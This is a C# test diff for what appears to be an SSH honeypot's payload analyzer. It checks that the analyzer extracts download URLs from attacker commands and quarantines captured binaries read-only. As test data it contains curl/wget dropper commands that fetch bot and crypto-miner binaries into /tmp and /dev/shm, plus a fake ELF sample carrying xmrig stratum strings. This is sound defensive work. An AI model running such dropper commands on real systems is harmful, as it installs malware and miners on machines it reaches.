@@ -120,6 +120,7 @@ public class SCPDetectorTests
     }
 }
 
+[Collection("LogDirSerial")]
 public class SCPUploadSessionTests
 {
     [Fact]
@@ -371,6 +372,7 @@ public class SCPUploadSessionTests
     }
 }
 
+[Collection("LogDirSerial")]
 public class DataHarvesterTests
 {
     [Fact]
@@ -389,6 +391,113 @@ public class DataHarvesterTests
         Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
         Assert.Contains("Command and Control", analysis.MitreAttackTechniques);
         Assert.Contains("Discovery", analysis.MitreAttackTechniques);
+    }
+
+    [Fact]
+    public void ExtractPayloadUrls_ExtractsSchemelessAndQuotedCurlWgetUrls()
+    {
+        var urls = DataHarvester.ExtractPayloadUrls("curl -fsSL 198.51.100.44:8080/bins/x86_64 -o /tmp/bot && wget 'http://203.0.113.10/dropper.elf' -O /dev/shm/d.elf");
+
+        Assert.Contains("http://198.51.100.44:8080/bins/x86_64", urls);
+        Assert.Contains("http://203.0.113.10/dropper.elf", urls);
+    }
+
+    [Fact]
+    public async Task CapturePayloadMetadataAsync_DownloadsCurlBinaryToReadOnlyQuarantineWithMetadataAndAnalysis()
+    {
+        var previousLogDir = Program.LogDir;
+        var previousAppDir = Program.AppDir;
+        var previousClient = DataHarvester.HttpClientOverride;
+        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
+        Program.LogDir = tempDir;
+        Program.AppDir = tempDir;
+
+        var elfPayload = new byte[]
+        {
+            0x7F, (byte)'E', (byte)'L', (byte)'F', 0x02, 0x01, 0x01, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x02, 0x00, 0x3E, 0x00
+        }.Concat(System.Text.Encoding.ASCII.GetBytes("stratum+tcp://198.51.100.77:3333\0xmrig\0")).ToArray();
+
+        DataHarvester.HttpClientOverride = new HttpClient(new StubHttpMessageHandler(_ =>
+        {
+            var resp = new HttpResponseMessage(System.Net.HttpStatusCode.OK)
+            {
+                Content = new ByteArrayContent(elfPayload)
+            };
+            resp.Content.Headers.ContentLength = elfPayload.Length;
+            return resp;
+        }));
+
+        try
+        {
+            var command = "curl -fsSL http://198.51.100.77/bins/miner.elf -o /tmp/kworker";
+            var analysis = DataHarvester.AnalyzeCommand(command);
+            var url = Assert.Single(analysis.PayloadUrls);
+            Assert.Equal("http://198.51.100.77/bins/miner.elf", url);
+
+            var context = new BinaryUploadContext(
+                SessionKey: "deadbeefcafebabe",
+                ShellSessionId: "shell-curl-1",
+                RemoteEndpoint: "203.0.113.88:50123",
+                RemoteIp: "203.0.113.88",
+                Username: "root",
+                ClientVersion: "SSH-2.0-OpenSSH_8.9",
+                SshBanner: "SSH-2.0-OmegaBlack",
+                DeliveryChannel: "pty",
+                CommandText: command,
+                ExchangeId: "deadbeefcafebabe:000002");
+
+            await DataHarvester.CapturePayloadMetadataAsync(url, context.SessionKey, context.ShellSessionId, context.RemoteEndpoint, context);
+
+            var uploadDir = Path.Combine(tempDir, "uploads", "deadbeef");
+            Assert.True(Directory.Exists(uploadDir));
+            var savedFile = Assert.Single(Directory.GetFiles(uploadDir, "*_kworker.quarantine"));
+            Assert.Equal(elfPayload, File.ReadAllBytes(savedFile));
+            Assert.True((File.GetAttributes(savedFile) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly);
+            if (!System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(System.Runtime.InteropServices.OSPlatform.Windows))
+            {
+                Assert.Equal(UnixFileMode.UserRead, File.GetUnixFileMode(savedFile));
+            }
+
+            var metaPath = savedFile + ".meta.json";
+            Assert.True(File.Exists(metaPath));
+            var meta = System.Text.Json.JsonSerializer.Deserialize<BinaryUploadMetadataRecord>(File.ReadAllText(metaPath));
+            Assert.NotNull(meta);
+            Assert.Equal("url_payload", meta!.Source);
+            Assert.Equal("captured", meta.Status);
+            Assert.Equal("kworker", meta.OriginalFilename);
+            Assert.Equal("ELF 64-bit LSB", meta.Analysis.FileFormat);
+            Assert.Equal("x86-64", meta.Analysis.Architecture);
+            Assert.Contains("crypto-miner:xmrig", meta.Analysis.SuspiciousIndicators);
+            Assert.Contains("crypto-miner:stratum", meta.Analysis.SuspiciousIndicators);
+        }
+        finally
+        {
+            DataHarvester.HttpClientOverride = previousClient;
+            Program.LogDir = previousLogDir;
+            Program.AppDir = previousAppDir;
+            foreach (var file in Directory.Exists(tempDir) ? Directory.GetFiles(tempDir, "*", SearchOption.AllDirectories) : Array.Empty<string>())
+            {
+                try
+                {
+                    if (!System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(System.Runtime.InteropServices.OSPlatform.Windows))
+                        File.SetUnixFileMode(file, UnixFileMode.UserRead | UnixFileMode.UserWrite);
+                    File.SetAttributes(file, FileAttributes.Normal);
+                }
+                catch { }
+            }
+            if (Directory.Exists(tempDir))
+                Directory.Delete(tempDir, recursive: true);
+        }
+    }
+
+    private sealed class StubHttpMessageHandler : HttpMessageHandler
+    {
+        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;
+        public StubHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler) => _handler = handler;
+        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
+            => Task.FromResult(_handler(request));
     }
 
     [Fact]
